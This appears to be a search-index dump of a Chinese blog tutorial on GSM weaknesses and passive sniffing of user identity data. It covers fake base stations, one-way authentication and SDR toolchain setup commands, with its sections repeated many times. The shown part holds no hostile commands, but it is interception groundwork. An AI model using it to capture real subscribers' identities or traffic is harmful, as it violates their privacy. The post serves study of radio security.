网络的鉴权存在的缺陷运营商是验证你手机是否合法用户，而手机是不会验证接入基站是否是合法的基站，这样进入了伪基站我们也是不知道的，如今的 3G,4G 验证会比 GSM 要安全很多。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#为什么我们手机会进入假基站"},{"categories":["wireless-hacking"],"content":" 1.1 GSM 攻击手法目前国内 GSM 攻击手法就两种：一种是主动 GSM 攻击另一种是被动 GSM 攻击 1.1.1 主动攻击：攻击者伪装成基站（BTS），然后发射诱导信号，引导被攻击者链接到非法基站，由于 GSM 属于单向鉴权，所以移动台只能被基站鉴权，而无法对基站进行鉴权，因此用户很容易被诱导至伪基站进行数据通信。当被攻击者进行数据交换，比如拨打电话或者发送短信时，攻击者通过伪造的基站对其发送的数据进行劫持丶篡改或监听以达到攻击目的。 1.1.2 被动攻击：即攻击者不会主动向被攻击者终端发送诱导信号，而是监听基站与移动台之间传播的广播信号，并且对信号进行解密以达到侦听的目的。 1.1.3 二者的区别：就是一个可以监听数据还可以动态修改往来的数据，而另一个只能被动监听数据而无法直接篡改，而本文实验过程是后者被动监听。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#gsm-攻击手法"},{"categories":["wireless-hacking"],"content":" 1.1 GSM 攻击手法目前国内 GSM 攻击手法就两种：一种是主动 GSM 攻击另一种是被动 GSM 攻击 1.1.1 主动攻击：攻击者伪装成基站（BTS），然后发射诱导信号，引导被攻击者链接到非法基站，由于 GSM 属于单向鉴权，所以移动台只能被基站鉴权，而无法对基站进行鉴权，因此用户很容易被诱导至伪基站进行数据通信。当被攻击者进行数据交换，比如拨打电话或者发送短信时，攻击者通过伪造的基站对其发送的数据进行劫持丶篡改或监听以达到攻击目的。 1.1.2 被动攻击：即攻击者不会主动向被攻击者终端发送诱导信号，而是监听基站与移动台之间传播的广播信号，并且对信号进行解密以达到侦听的目的。 1.1.3 二者的区别：就是一个可以监听数据还可以动态修改往来的数据，而另一个只能被动监听数据而无法直接篡改，而本文实验过程是后者被动监听。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#主动攻击"},{"categories":["wireless-hacking"],"content":" 1.1 GSM 攻击手法目前国内 GSM 攻击手法就两种：一种是主动 GSM 攻击另一种是被动 GSM 攻击 1.1.1 主动攻击：攻击者伪装成基站（BTS），然后发射诱导信号，引导被攻击者链接到非法基站，由于 GSM 属于单向鉴权，所以移动台只能被基站鉴权，而无法对基站进行鉴权，因此用户很容易被诱导至伪基站进行数据通信。当被攻击者进行数据交换，比如拨打电话或者发送短信时，攻击者通过伪造的基站对其发送的数据进行劫持丶篡改或监听以达到攻击目的。 1.1.2 被动攻击：即攻击者不会主动向被攻击者终端发送诱导信号，而是监听基站与移动台之间传播的广播信号，并且对信号进行解密以达到侦听的目的。 1.1.3 二者的区别：就是一个可以监听数据还可以动态修改往来的数据，而另一个只能被动监听数据而无法直接篡改，而本文实验过程是后者被动监听。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#被动攻击"},{"categories":["wireless-hacking"],"content":" 1.1 GSM 攻击手法目前国内 GSM 攻击手法就两种：一种是主动 GSM 攻击另一种是被动 GSM 攻击 1.1.1 主动攻击：攻击者伪装成基站（BTS），然后发射诱导信号，引导被攻击者链接到非法基站，由于 GSM 属于单向鉴权，所以移动台只能被基站鉴权，而无法对基站进行鉴权，因此用户很容易被诱导至伪基站进行数据通信。当被攻击者进行数据交换，比如拨打电话或者发送短信时，攻击者通过伪造的基站对其发送的数据进行劫持丶篡改或监听以达到攻击目的。 1.1.2 被动攻击：即攻击者不会主动向被攻击者终端发送诱导信号，而是监听基站与移动台之间传播的广播信号，并且对信号进行解密以达到侦听的目的。 1.1.3 二者的区别：就是一个可以监听数据还可以动态修改往来的数据，而另一个只能被动监听数据而无法直接篡改，而本文实验过程是后者被动监听。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#二者的区别"},{"categories":["wireless-hacking"],"content":" 1.2 GSM 加密算法GSM 使用了很多算法，但是其中主要使用的就三种加密算法：A3 鉴权算法，A8 是密钥的约定算法，A5 是用于加密的流密码。（具体算法描述和简介作者推荐大家去看《无线电安全攻防大揭秘》） ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:2","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#gsm-加密算法"},{"categories":["wireless-hacking"],"content":" 2 攻击复现","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#攻击复现"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#环境搭建"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#ubuntu"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#安装编译依赖包"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#使用pybombs构建"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#安装常用组件"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#安装最新-wireshark"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#kali-linux"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 